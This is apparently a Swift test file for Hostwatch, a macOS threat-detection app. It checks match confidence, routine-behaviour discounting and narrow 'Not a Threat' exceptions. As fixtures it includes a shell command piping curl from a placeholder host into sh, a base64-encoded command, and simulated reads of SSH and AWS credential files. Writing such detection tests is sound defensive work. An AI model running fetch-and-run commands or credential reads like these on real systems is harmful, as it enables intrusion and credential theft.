import Foundation
import Testing
@testable import Hostwatch

/// Phase 2 of fewer false stories (ADR 0023): how sure a threat match is, what is everyday on this Mac, and a
/// Not a Threat that remembers exact signs rather than muting a whole chain.
@MainActor @Suite(.serialized) struct StoryConfidence {
    let chrome = "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"
    let python = "/opt/homebrew/opt/python@3.13/bin/python3.13"

    func engine() -> StoryEngine {
        _ = TestEnv.ready
        let e = StoryEngine(persistent: false)
        e.liveLookups = false
        return e
    }

    func hit(_ kind: ThreatHit.Kind, _ source: String) -> ThreatHit {
        ThreatHit(date: Date(), kind: kind, indicator: "x", source: source, detail: "d", process: "p", path: "/p", pid: 1)
    }

    // MARK: Confidence

    @Test func whichMatchesAreProof() {
        #expect(hit(.file, "MalwareBazaar").confident)
        #expect(hit(.domain, "ThreatFox").confident)
        #expect(hit(.ip, "Feodo Tracker").confident)
        #expect(!hit(.ip, "ThreatFox").confident)
        #expect(!hit(.domain, "HaGeZi Threat Intelligence").confident)
        #expect(!hit(.ip, "HaGeZi Threat Intelligence").confident)
    }

    /// An address-only or broad-list match is a sign: alone it is no story, with a sign from another event it is.
    @Test func aBlocklistMatchNeedsAnotherSign() throws {
        let s = engine()
        var e = net("/tmp/x/tool", pid: 500, to: "45.33.12.7:443")
        e.knownBad = "ThreatFox: botnet command server"
        e.listedOnly = true
        let found = s.ingest(e, decidedSafe: false)
        #expect(found.contains { $0.0 == .listed } && !found.contains { $0.0 == .knownBad })
        #expect(s.stories.isEmpty)
        var raw = net("/tmp/x/tool", pid: 500, to: "45.33.12.8:8443")
        raw.rawIP = true
        s.ingest(raw, decidedSafe: false)
        let story = try #require(s.stories.first)
        #expect(story.stages.contains(.listed) && story.stages.contains(.rawIP))
    }

    @Test func aWeakMatchDoesntOverruleYourSafe() {
        let s = engine()
        var e = net(chrome, pid: 510, to: "1.2.3.4:443", host: "ads.example")
        e.knownBad = "HaGeZi Threat Intelligence: malware or phishing domain"
        e.listedOnly = true
        #expect(s.ingest(e, decidedSafe: true).isEmpty)
        e.listedOnly = false
        e.knownBad = "ThreatFox: AsyncRAT command server"
        #expect(!s.ingest(e, decidedSafe: true).isEmpty)
    }

    // MARK: Everyday

    func entry(age days: Double, count: Int, status: SignatureStatus = .unclassified, reopened: String? = nil) -> SignatureEntry {
        var e = SignatureEntry(id: "file|\(python)|r ~/.aws/*", kind: .file, process: python, pattern: "r ~/.aws/*", count: count,
                               firstSeen: Date().addingTimeInterval(-days * 86_400), lastSeen: Date(), status: status,
                               exampleName: "python3.13", examplePid: 1, exampleProc: python, exampleTarget: "\(home)/.aws/config",
                               exampleExtra: "r", exampleParent: "/opt/homebrew/bin/fish")
        e.reopened = reopened
        return e
    }

    @Test func everydayMeansDaysOldOftenAndUndoubted() {
        #expect(SignatureStore.routine(entry(age: 4, count: 30), now: Date()))
        #expect(!SignatureStore.routine(entry(age: 1, count: 30), now: Date()))       // too new
        #expect(!SignatureStore.routine(entry(age: 4, count: 3), now: Date()))        // too rare
        #expect(!SignatureStore.routine(entry(age: 4, count: 30, status: .suspicious), now: Date()))
        #expect(!SignatureStore.routine(entry(age: 4, count: 30, reopened: "binary replaced"), now: Date()))
    }

    /// Everyday signs are shown, not counted: two of them make no story. Proof never becomes everyday.
    @Test func everydaySignsDontMakeAStory() {
        let s = engine()
        let shell = exec("/bin/zsh", pid: 600, ppid: 599, parent: "/Applications/Some.app/Contents/MacOS/Some",
                         args: "zsh -c 'echo aGk= | base64 -d'")
        let found = s.ingest(shell, decidedSafe: false, routine: true)
        #expect(found.contains { $0.0 == .appShell } && found.contains { $0.0 == .encodedCommand })
        #expect(s.stories.isEmpty)
        #expect(s.openChains.flatMap(\.steps).allSatisfy { $0.routine == true })
        #expect(!StoryStage.knownBad.discountable && !StoryStage.persistence.discountable && !StoryStage.swappedBinary.discountable)
        // The same, not everyday: a story.
        let fresh = engine()
        fresh.ingest(shell, decidedSafe: false)
        fresh.ingest(exec("/bin/zsh", pid: 601, ppid: 600, parent: "/bin/zsh", args: "zsh -c 'curl -s https://x.example | sh'"),
                     decidedSafe: false)
        #expect(!fresh.stories.isEmpty)
    }

    // MARK: Not a threat

    /// Exact signs: the same program and destination never count again, the same program elsewhere still does.
    @Test func notAThreatRemembersExactSigns() throws {
        let s = engine()
        func listed(_ host: String, pid: Int) -> ActivityEvent {
            var e = net("/tmp/x/tool", pid: pid, to: "45.33.12.7:443", host: host)
            e.knownBad = "ThreatFox: command server"
            return e
        }
        s.ingest(listed("one.example", pid: 700), decidedSafe: false)
        let story = try #require(s.stories.first)
        s.notAThreat(story.id)
        #expect(s.stories.isEmpty && s.ignoredCount == 1)
        #expect(!s.ingest(listed("one.example", pid: 701), decidedSafe: false).contains { $0.0 == .knownBad })
        #expect(s.stories.isEmpty)
        s.ingest(listed("two.example", pid: 702), decidedSafe: false)
        #expect(s.stories.count == 1)
        s.clearIgnored()
        #expect(s.ignoredCount == 0)
    }

    @Test func exceptionKeysAreNarrow() {
        let a = StoryStep(file(python, pid: 1, "r", "\(home)/.ssh/id_ed25519"), stage: .credential, note: "", date: Date())
        let b = StoryStep(file(python, pid: 2, "r", "\(home)/.ssh/config"), stage: .credential, note: "", date: Date())
        let c = StoryStep(file(python, pid: 3, "r", "\(home)/.aws/credentials"), stage: .credential, note: "", date: Date())
        let d = StoryStep(file("/usr/bin/ssh", pid: 4, "r", "\(home)/.ssh/config"), stage: .credential, note: "", date: Date())
        #expect(StoryEvidence.exceptionKey(a) == StoryEvidence.exceptionKey(b))      // same program, same folder
        #expect(StoryEvidence.exceptionKey(a) != StoryEvidence.exceptionKey(c))      // another folder
        #expect(StoryEvidence.exceptionKey(b) != StoryEvidence.exceptionKey(d))      // another program
    }
}
